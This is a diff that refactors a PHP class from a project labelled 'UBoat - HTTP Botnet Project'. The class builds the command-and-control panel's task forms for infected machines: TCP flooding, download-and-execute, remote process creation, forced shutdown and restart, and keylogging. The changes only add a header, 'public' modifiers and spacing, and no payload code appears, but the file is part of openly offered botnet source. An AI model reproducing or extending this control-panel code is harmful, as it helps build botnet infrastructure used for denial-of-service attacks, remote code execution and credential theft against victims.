@@ -1,13 +1,12 @@
 <?php
-/**
- * Created by PhpStorm.
- * User: Ben
- * Date: 1/22/2016
- * Time: 11:09 PM
- */
-class taskslayout{
 
-    function tcpFlood()
+/**
+ * This file is part of UBoat - HTTP Botnet Project
+ */
+
+class taskslayout
+{
+    public function tcpFlood()
     {
         echo json_encode('  <h4>Please fill the form.</h4><br>
                 <div class="col-lg-5">
@@ -26,24 +25,28 @@ class taskslayout{
                 </div>
                 ');
     }
-    function Shutdown()
+
+    public function Shutdown()
     {
         echo json_encode('
             <input type="hidden" name="params[]" value="shutdown">
         ');
     }
-    function Restart()
+
+    public function Restart()
     {
         echo json_encode('
             <input type="hidden" name="params[]" value="restart">
         ');
     }
-    function downloadExecute()
+
+    public function downloadExecute()
     {
         echo json_encode('  <h4>Please enter a file direct link</h4>
                 <input type="text" name="params[]" class="form-control url_check" style="width: 50%">');
     }
-    function createRemoteProcess()
+
+    public function createRemoteProcess()
     {
         echo json_encode('  <h4>Please enter a file path</h4>
             <div class="col-md-5" style="padding-top: 1px;">
@@ -57,14 +60,16 @@ class taskslayout{
             <div class="clearfix"></div>
             ');
     }
-    function Update()
+
+    public function Update()
     {
         echo json_encode('  <h4>Please select a file</h4><br>
             <span class="btn btn-default btn-file">
                 Browse <input type="file">
             </span>');
     }
-    function VisitUrl()
+
+    public function VisitUrl()
     {
         echo json_encode('  <h4>Please enter website url</h4>
             <div class="col-md-10">
@@ -72,7 +77,7 @@ class taskslayout{
             </div>');
     }
 
-    function MessageBox()
+    public function MessageBox()
     {
         echo json_encode('  <h4>Please fill the messagebox data</h4>
             <div class="col-md-5" style="padding-top: 1px;">
@@ -85,7 +90,8 @@ class taskslayout{
             <div class="clearfix"></div>
             ');
     }
-    function Keylog()
+
+    public function Keylog()
     {
         echo json_encode('
             <div class="col-lg-12">
